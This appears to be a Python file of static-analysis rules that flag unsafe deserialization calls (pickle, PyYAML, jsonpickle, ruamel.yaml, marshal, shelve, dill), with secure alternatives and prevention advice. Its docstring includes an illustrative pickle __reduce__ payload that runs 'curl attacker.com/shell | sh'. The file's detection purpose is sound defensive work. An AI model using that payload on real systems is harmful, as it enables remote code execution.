"""
Insecure Deserialization Security Rules for Python

Rules in this file:
- PYTHON-LANG-SEC-040: Pickle Deserialization Detected (CWE-502)
- PYTHON-LANG-SEC-041: PyYAML Unsafe Load (CWE-502)
- PYTHON-LANG-SEC-042: jsonpickle Usage Detected (CWE-502)
- PYTHON-LANG-SEC-043: ruamel.yaml Unsafe Usage (CWE-502)
- PYTHON-LANG-SEC-044: marshal Usage Detected (CWE-502)
- PYTHON-LANG-SEC-045: shelve Usage Detected (CWE-502)
- PYTHON-LANG-SEC-046: dill Deserialization Detected (CWE-502)

Security Impact: HIGH
CWE: CWE-502 (Deserialization of Untrusted Data)
OWASP: A08:2021 - Software and Data Integrity Failures

DESCRIPTION:
Python's pickle module and its derivatives (dill, shelve, jsonpickle) can
instantiate arbitrary Python objects during deserialization, enabling remote
code execution when processing untrusted data. Similarly, PyYAML's yaml.load()
and ruamel.yaml with unsafe type settings can construct arbitrary Python objects
from YAML input. The marshal module, while not designed for security, also
deserializes binary data without validation.

SECURITY IMPLICATIONS:
Pickle deserialization executes the __reduce__ method of serialized objects,
which can be crafted to run arbitrary system commands. An attacker who controls
pickled data (from network input, file uploads, cookies, or message queues) can
achieve full remote code execution. PyYAML's yaml.load() without SafeLoader
supports Python-specific YAML tags (!!python/object) that instantiate arbitrary
classes. The dill library extends pickle with even broader object support,
amplifying the attack surface. shelve.open() uses pickle internally for
persistent storage.

    # Attack scenario: RCE via crafted pickle payload
    import pickle, os
    class Exploit:
        def __reduce__(self):
            return (os.system, ("curl attacker.com/shell | sh",))
    payload = pickle.dumps(Exploit())
    # Victim deserializes: pickle.loads(payload) -> executes shell command

VULNERABLE EXAMPLE:
```python
import pickle
import yaml
import marshal
import shelve

# SEC-040: pickle
data = pickle.loads(b"malicious")
with open("data.pkl", "rb") as f:
    obj = pickle.load(f)
unpickler = pickle.Unpickler(f)

# SEC-041: yaml unsafe load
with open("config.yml") as f:
    config = yaml.load(f, Loader=yaml.FullLoader)
    unsafe = yaml.unsafe_load(f)

# SEC-042: jsonpickle
import jsonpickle
decoded = jsonpickle.decode('{"py/object": "os.system"}')

# SEC-043: ruamel.yaml unsafe
from ruamel.yaml import YAML
ym = YAML(typ="unsafe")

# SEC-044: marshal
code_obj = marshal.loads(b"data")

# SEC-045: shelve
db = shelve.open("mydb")

# SEC-046: dill
import dill
obj = dill.loads(b"data")
```

SECURE EXAMPLE:
```python
import json, yaml
# Use JSON for data interchange (no code execution)
data = json.loads(network_data)
# Use SafeLoader for YAML parsing
config = yaml.safe_load(user_yaml_string)
# Use hmac signing to verify pickle integrity (defense in depth)
import hmac, hashlib
expected_sig = hmac.new(secret_key, data, hashlib.sha256).digest()
if not hmac.compare_digest(expected_sig, received_sig):
    raise ValueError("Tampered data")
```

DETECTION AND PREVENTION:
- Replace pickle with JSON, MessagePack, or Protocol Buffers for data exchange
- Use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader) exclusively
- Replace jsonpickle with standard json module for JSON serialization
- Use ruamel.yaml with typ='safe' to prevent arbitrary object construction
- Never deserialize data from untrusted sources without cryptographic integrity checks
- Implement allowlists via pickle.Unpickler.find_class() if pickle is unavoidable

COMPLIANCE:
- CWE-502: Deserialization of Untrusted Data
- OWASP A08:2021 - Software and Data Integrity Failures
- SANS Top 25 (2023) - CWE-502: Deserialization of Untrusted Data
- NIST SP 800-53: SI-10 (Information Input Validation)

REFERENCES:
- https://cwe.mitre.org/data/definitions/502.html
- https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- https://docs.python.org/3/library/pickle.html#restricting-globals
- https://pyyaml.org/wiki/PyYAMLDocumentation
- https://docs.python.org/3/library/marshal.html
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, QueryType


class PickleModule(QueryType):
    fqns = ["pickle", "_pickle", "cPickle"]


class YamlModule(QueryType):
    fqns = ["yaml"]


class MarshalModule(QueryType):
    fqns = ["marshal"]


class DillModule(QueryType):
    fqns = ["dill"]


class JsonPickleModule(QueryType):
    fqns = ["jsonpickle"]


class RuamelYamlModule(QueryType):
    fqns = ["ruamel.yaml"]


class ShelveModule(QueryType):
    fqns = ["shelve"]


@python_rule(
    id="PYTHON-LANG-SEC-040",
    name="Pickle Deserialization Detected",
    severity="HIGH",
    category="lang",
    cwe="CWE-502",
    tags="python,pickle,deserialization,rce,owasp-a08,cwe-502",
    message="pickle.loads/load detected. Pickle can execute arbitrary code. Use json or msgpack instead.",
    owasp="A08:2021",
)
def detect_pickle():
    """Detects pickle.loads/load/Unpickler usage."""
    return PickleModule.method("loads", "load", "Unpickler")


@python_rule(
    id="PYTHON-LANG-SEC-041",
    name="PyYAML Unsafe Load",
    severity="HIGH",
    category="lang",
    cwe="CWE-502",
    tags="python,yaml,deserialization,rce,owasp-a08,cwe-502",
    message="yaml.load() or yaml.unsafe_load() detected. Use yaml.safe_load() instead.",
    owasp="A08:2021",
)
def detect_yaml_load():
    """Detects yaml.load() and yaml.unsafe_load() calls."""
    return YamlModule.method("load", "unsafe_load")


@python_rule(
    id="PYTHON-LANG-SEC-042",
    name="jsonpickle Usage Detected",
    severity="HIGH",
    category="lang",
    cwe="CWE-502",
    tags="python,jsonpickle,deserialization,rce,cwe-502",
    message="jsonpickle.decode() detected. jsonpickle can execute arbitrary code. Use json instead.",
    owasp="A08:2021",
)
def detect_jsonpickle():
    """Detects jsonpickle.decode/loads usage."""
    return JsonPickleModule.method("decode", "loads")


@python_rule(
    id="PYTHON-LANG-SEC-043",
    name="ruamel.yaml Unsafe Usage",
    severity="HIGH",
    category="lang",
    cwe="CWE-502",
    tags="python,ruamel,yaml,deserialization,rce,cwe-502",
    message="ruamel.yaml with unsafe typ detected. Use typ='safe' instead.",
    owasp="A08:2021",
)
def detect_ruamel_unsafe():
    """Detects ruamel.yaml YAML() with unsafe typ."""
    return RuamelYamlModule.method("YAML").where("typ", "unsafe")


@python_rule(
    id="PYTHON-LANG-SEC-044",
    name="marshal Usage Detected",
    severity="MEDIUM",
    category="lang",
    cwe="CWE-502",
    tags="python,marshal,deserialization,cwe-502",
    message="marshal.loads/load detected. Marshal is not secure against erroneous or malicious data.",
    owasp="A08:2021",
)
def detect_marshal():
    """Detects marshal.loads/load/dump/dumps usage."""
    return MarshalModule.method("loads", "load")


@python_rule(
    id="PYTHON-LANG-SEC-045",
    name="shelve Usage Detected",
    severity="MEDIUM",
    category="lang",
    cwe="CWE-502",
    tags="python,shelve,deserialization,pickle,cwe-502",
    message="shelve.open() uses pickle internally. Not safe for untrusted data.",
    owasp="A08:2021",
)
def detect_shelve():
    """Detects shelve.open() which uses pickle internally."""
    return ShelveModule.method("open")


@python_rule(
    id="PYTHON-LANG-SEC-046",
    name="dill Deserialization Detected",
    severity="HIGH",
    category="lang",
    cwe="CWE-502",
    tags="python,dill,deserialization,rce,cwe-502",
    message="dill.loads/load detected. dill extends pickle and can execute arbitrary code.",
    owasp="A08:2021",
)
def detect_dill():
    """Detects dill.loads/load usage."""
    return DillModule.method("loads", "load")
